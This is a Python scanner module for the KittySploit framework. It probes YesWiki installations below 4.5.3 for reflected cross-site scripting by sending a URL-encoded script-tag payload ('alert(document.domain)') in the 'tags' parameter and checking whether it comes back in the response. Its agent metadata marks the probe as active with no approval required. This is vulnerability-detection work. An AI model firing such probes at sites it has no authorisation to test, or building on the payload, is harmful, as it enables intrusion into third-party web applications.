#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""YesWiki versions < 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'YesWiki - Cross-Site Scripting Detection',
        'description': 'YesWiki versions < 4.5.3 are vulnerable to multiple reflected cross-site scripting (XSS) vulnerabilities, allowing arbitrary JavaScript execution.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'yeswiki', 'cms'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/YesWiki/yeswiki/security/advisories/GHSA-5724-x3rh-5qqq'],
    }

    def run(self):
        path = '/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('<script>alert(document.domain)</script>', 'yeswiki-base',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='YesWiki - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

